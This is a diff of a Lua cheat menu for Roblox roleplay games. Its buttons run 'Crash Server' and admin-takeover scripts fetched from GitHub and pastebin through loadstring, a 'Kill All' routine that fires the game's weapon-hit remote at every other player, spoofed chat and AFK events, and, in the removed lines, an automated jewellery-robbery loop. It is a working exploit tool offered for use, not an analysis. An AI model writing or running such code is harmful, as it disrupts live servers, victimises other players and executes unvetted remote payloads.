@@ -723,42 +723,21 @@ loadstring(game:HttpGet(Source .. "Loader.lua"),"Loader")(Branch,NotificationTim
           end
     })
     PlayersTab:AddButton({
-        Name = "ACS Hub V1 - Risco",
+        Name = "ACS Hub V1",
         Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/StoneDev47/KLB-HUB---ACS/main/mainhub", true))()
           end
     })
     PlayersTab:AddButton({
-        Name = "Roubar joalheria - CDA",
+        Name = "Crash Server 1",
         Callback = function()
-            local character = game.Players.LocalPlayer.Character
-local pos = character:GetPivot().p
-shared.a = not shared.a
-
-while shared.a do
-    local r = workspace["Mapa [RP]"].Joalheria.Sistem.Roubavel.Roubar1
-    local prompt = r:FindFirstChildOfClass("ProximityPrompt")
-    
-    character:MoveTo(r:GetPivot().p)
-    prompt.HoldDuration = -math.huge
-
-    for i = 1, 30 do
-        prompt.Enabled = true
-        fireproximityprompt(prompt)
-    end
-
-    task.wait()
-end
-
-local prompt = workspace.Vender:FindFirstChildOfClass("ProximityPrompt")
-character:MoveTo(workspace.Vender:GetPivot().p)
-prompt.HoldDuration = -math.huge
-
-task.wait(.2)
-fireproximityprompt(prompt)
-task.wait(.2)
-
-character:MoveTo(pos)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/arandomuser0/scriptroblox/main/tarantula1.lua"))()
+          end 
+    })
+    PlayersTab:AddButton({
+        Name = "Crash Server 2",
+        Callback = function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/arandomuser0/scriptroblox/main/tarantula2.lua"))()
           end 
     })
     local Section = TrollTab:AddSection({
@@ -1004,13 +983,38 @@ TrollTab:AddButton({
 })
 
     PlayersTab:AddButton({
-        Name = "V1 (Troll) - Tool risco",
+        Name = "Filter Console",
         Callback = function()
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/Pedroxz63/PedroMenu/main/README.md'))()
+            local Filters = {
+                'WalkSpeed'
+            };
+            local CoreGui = game:GetService('CoreGui')
+            local DevConsoleUI = CoreGui.DevConsoleMaster.DevConsoleWindow.DevConsoleUI
+            local function FindString(str)
+                local Found = {}
+                for i = 1, #Filters do
+                    if string.find(str, Filters[i]) then
+                        table.insert(Found, Filters[i])
+                    end
+                end
+                return Found
+            end
+            
+            DevConsoleUI.DescendantAdded:Connect(function(ins)
+                if ins:IsA('TextLabel') then
+                    local Found = FindString(ins.Text)
+                    if #Found ~= 0 then
+                        ins.RichText = true
+                        for i = 1, #Found do
+                            ins.Text = string.gsub(ins.Text, Found[i], '<font color="#e8f31d">'..Found[i]..'</font>')
+                        end
+                    end
+                end
+            end)
           end   
         })
     PlayersTab:AddButton({
-        Name = "Matar todos Cda (Precisa de arma)",
+        Name = "Kill All Cidade Alta",
         Callback = function()
             local player = game.Players.LocalPlayer
 local storage = game.ReplicatedStorage.ACS_Engine.Events
@@ -2294,6 +2298,51 @@ UIS.InputBegan:Connect(function(input)
 end)
             end
         })
+JogadorTab:AddButton({
+	Name = "Kill All - Precisa de alguem com arma",
+	Callback = function()
+        local user, tool
+        for i,p in next, game.Players:GetPlayers() do
+            for i,v in next, p.Backpack:GetChildren() do
+                if v:FindFirstChild("WeaponType") then
+                    user, tool = p, v
+                    break
+                end
+            end
+        
+            if tool then break end
+            local c = p.Character
+            local t = c and c:FindFirstChildOfClass("Tool")
+            if t and t:FindFirstChild("WeaponType") then
+                user, tool = p, t
+            end
+        end
+        
+        local rmt = game.ReplicatedStorage.WeaponsSystem.Network.WeaponHit
+        local plr = game.Players.LocalPlayer
+        
+        for i,v in next, game.Players:GetPlayers() do
+            if v ~= plr and v ~= user then
+                local chr = v.Character
+                local hum = chr:FindFirstChild("Humanoid")
+                local head = chr:FindFirstChild("Head")
+        
+                rmt:FireServer(tool, {
+                    ["p"] = head.Position,
+                    ["pid"] = 1,
+                    ["part"] = head,
+                    ["d"] = 0,
+                    ["maxDist"] = 0,
+                    ["h"] = hum,
+                    ["m"] = Enum.Material.Plastic,
+                    ["n"] = Vector3.new(),
+                    ["t"] = 0,
+                    ["sid"] = 24
+                })
+            end
+        end
+  	end    
+})
 CarroTab:AddButton({
 	Name = "Comprar Fusca Cda - Sem ter Money",
 	Callback = function()
@@ -4328,7 +4377,7 @@ local Section = EspTab:AddSection({
           end    
         })
     JogadorTab:AddButton({
-        Name = "Kill/Explode All Hub (Explode)",
+        Name = "Explode Hub",
         Callback = function()
             loadstring(game:HttpGetAsync("https://pastebin.com/raw/A34Z7gMx"))()
               end       
@@ -4338,7 +4387,7 @@ local Section = JogadorTab:AddSection({
 })
 
     JogadorTab:AddButton({
-        Name = "Free cam Bind R",
+        Name = "Free Cam",
         Callback = function()
             local allowspeedmove = true
 wait(1)
@@ -4490,6 +4539,35 @@ v.Lifetime = NumberRange.new(0)
 end
               end          
         })
+JogadorTab:AddButton({
+	Name = "Fake Digitando Eb Do Tevez",
+	Callback = function()
+        local args = {
+            [1] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Remotes.Chatting:FireServer(unpack(args))
+        wait(000000.5)
+  	end    
+})
+JogadorTab:AddButton({
+	Name = "Anti Afk Eb Do Tevez",
+	Callback = function()
+        local args = {
+            [1] = false
+        }
+        
+        game:GetService("ReplicatedStorage").Remotes.AFK:FireServer(unpack(args))
+        wait(000000.5)
+  	end    
+})
+JogadorTab:AddButton({
+	Name = "Fource Reset Eb Do Tevez",
+	Callback = function()
+        game:GetService("ReplicatedStorage").Remotes.Menu:FireServer()
+        wait(000000.5)
+  	end    
+})
     EspTab:AddButton({
         Name = "Esp V3",
         Callback = function()
@@ -5663,10 +5741,16 @@ MenusTab:AddButton({
   	end    
 })
     AdmTab:AddButton({
-        Name = "Virar ADM - Ter mesmo CMD que mesmo ADM",
+        Name = "Reviz Admin - Risco detect Adonis",
         Callback = function()
             loadstring(game:HttpGetAsync("https://pastebin.com/raw/Caniwq2N"))()
-          end       
+          end      
+})
+    AdmTab:AddButton({
+        Name = "Puxar Adonis ADMIN (beta)",
+        Callback = function()
+            loadstring(game:HttpGetAsync("https://pastebin.com/raw/dsasdasd"))()
+          end    
     })
     AdmTab:AddButton({
         Name = "logs ADM - Tem Bypass Pode usar Tranquilo",
